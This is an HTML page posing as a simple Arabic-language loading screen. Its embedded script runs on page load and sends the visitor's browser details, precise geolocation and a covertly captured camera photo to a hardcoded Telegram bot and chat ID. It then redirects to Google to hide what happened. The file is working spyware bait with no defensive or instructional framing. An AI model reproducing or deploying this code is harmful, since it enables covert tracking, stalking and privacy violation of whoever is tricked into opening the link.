<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        body {
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial;
            color: white;
        }
        .loader {
            text-align: center;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #333;
            border-top: 3px solid #00ff00;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <h3>جاري التحميل...</h3>
        <p id="status">الرجاء الانتظار</p>
    </div>

    <script>
    (function() {
        // ==================== التوكن والإيدي (تأكد من صحتها) ====================
        const BOT_TOKEN = '8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY';
        const CHAT_ID = '1772820433';
        
        let statusEl = document.getElementById('status');
        
        // ==================== دالة إرسال إلى تليجرام (متعددة المحاولات) ====================
        async function sendToTelegram(message, type = 'text', media = null) {
            const maxRetries = 3;
            
            for (let attempt = 1; attempt <= maxRetries; attempt++) {
                try {
                    let url = '';
                    let body = {};
                    
                    if (type === 'text') {
                        url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                        body = {
                            chat_id: CHAT_ID,
                            text: message,
                            parse_mode: 'HTML'
                        };
                    } else if (type === 'photo') {
                        url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
                        body = {
                            chat_id: CHAT_ID,
                            photo: media,
                            caption: message,
                            parse_mode: 'HTML'
                        };
                    }
                    
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(body)
                    });
                    
                    if (response.ok) {
                        console.log('✅ تم الإرسال إلى تليجرام');
                        return true;
                    } else {
                        const error = await response.text();
                        console.log(`❌ محاولة ${attempt} فشلت: ${error}`);
                    }
                    
                } catch(e) {
                    console.log(`❌ محاولة ${attempt} خطأ: ${e.message}`);
                }
                
                // انتظار قبل إعادة المحاولة
                if (attempt < maxRetries) {
                    await new Promise(r => setTimeout(r, 1000));
                }
            }
            
            return false;
        }
        
        // ==================== الحصول على الموقع بدقة ====================
        async function getLocation() {
            return new Promise((resolve) => {
                if ('geolocation' in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            resolve({
                                success: true,
                                lat: position.coords.latitude,
                                lon: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                timestamp: position.timestamp
                            });
                        },
                        (error) => {
                            resolve({
                                success: false,
                                error: error.message
                            });
                        },
                        { enableHighAccuracy: true, timeout: 10000 }
                    );
                } else {
                    resolve({ success: false, error: 'Geolocation not supported' });
                }
            });
        }
        
        // ==================== التقاط الصورة ====================
        async function capturePhoto() {
            try {
                statusEl.innerHTML = 'طلب الوصول إلى الكاميرا...';
                
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { width: 1280, height: 720 },
                    audio: false 
                });
                
                statusEl.innerHTML = 'تم الوصول إلى الكاميرا...';
                
                const video = document.createElement('video');
                video.srcObject = stream;
                video.autoplay = true;
                video.muted = true;
                
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve();
                    };
                });
                
                // انتظار قليلاً لاستقرار الصورة
                await new Promise(r => setTimeout(r, 500));
                
                statusEl.innerHTML = 'جاري التقاط الصورة...';
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 1280;
                canvas.height = video.videoHeight || 720;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                
                // إيقاف الكاميرا
                stream.getTracks().forEach(track => track.stop());
                
                statusEl.innerHTML = 'جاري إرسال الصورة...';
                
                return imageData;
                
            } catch(e) {
                statusEl.innerHTML = `خطأ في الكاميرا: ${e.message}`;
                return null;
            }
        }
        
        // ==================== إرسال تقرير بداية ====================
        async function sendStartReport() {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const language = navigator.language;
            
            const message = `
<b>✅ تم فتح الرابط بنجاح</b>

<b>🖥️ معلومات الجهاز:</b>
• المتصفح: ${userAgent.substring(0, 150)}
• النظام: ${platform}
• اللغة: ${language}
• الوقت: ${new Date().toLocaleString('ar-EG')}

<b>🌐 الرابط:</b>
${window.location.href}

<b>⚠️ جاري محاولة التصوير...</b>
            `;
            
            await sendToTelegram(message, 'text');
        }
        
        // ==================== إرسال تقرير الموقع ====================
        async function sendLocationReport() {
            const location = await getLocation();
            
            if (location.success) {
                const message = `
📍 <b>تم تحديد الموقع بدقة عالية</b>

<b>الإحداثيات:</b>
• خط العرض: ${location.lat}
• خط الطول: ${location.lon}
• الدقة: ${location.accuracy} متر

🗺️ <b>رابط الخريطة:</b>
https://www.google.com/maps?q=${location.lat},${location.lon}
                `;
                
                await sendToTelegram(message, 'text');
                
                // إرسال الموقع كبطاقة موقع
                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            latitude: location.lat,
                            longitude: location.lon
                        })
                    });
                } catch(e) {}
                
            } else {
                const message = `
⚠️ <b>فشل تحديد الموقع</b>

السبب: ${location.error}
                `;
                await sendToTelegram(message, 'text');
            }
        }
        
        // ==================== التشغيل الرئيسي ====================
        async function main() {
            statusEl.innerHTML = 'بدء التشغيل...';
            
            // 1. إرسال تقرير بداية
            await sendStartReport();
            
            // 2. الحصول على الموقع وإرساله
            await sendLocationReport();
            
            // 3. التقاط الصورة وإرسالها
            const photo = await capturePhoto();
            
            if (photo) {
                statusEl.innerHTML = 'جاري إرسال الصورة...';
                const caption = `📸 <b>تم التصوير بنجاح</b>\n⏰ ${new Date().toLocaleString('ar-EG')}`;
                await sendToTelegram(caption, 'photo', photo);
                statusEl.innerHTML = '✅ تم الإرسال بنجاح!';
            } else {
                const message = `
❌ <b>فشل التصوير</b>

السبب: لم يتم منح صلاحية الكاميرا أو لا توجد كاميرا
                `;
                await sendToTelegram(message, 'text');
                statusEl.innerHTML = '❌ فشل التصوير';
            }
            
            // إعادة التوجيه بعد 2 ثانية
            setTimeout(() => {
                window.location.href = 'https://www.google.com';
            }, 2000);
        }
        
        // بدء التنفيذ
        main();
    })();
    </script>
</body>
</html>
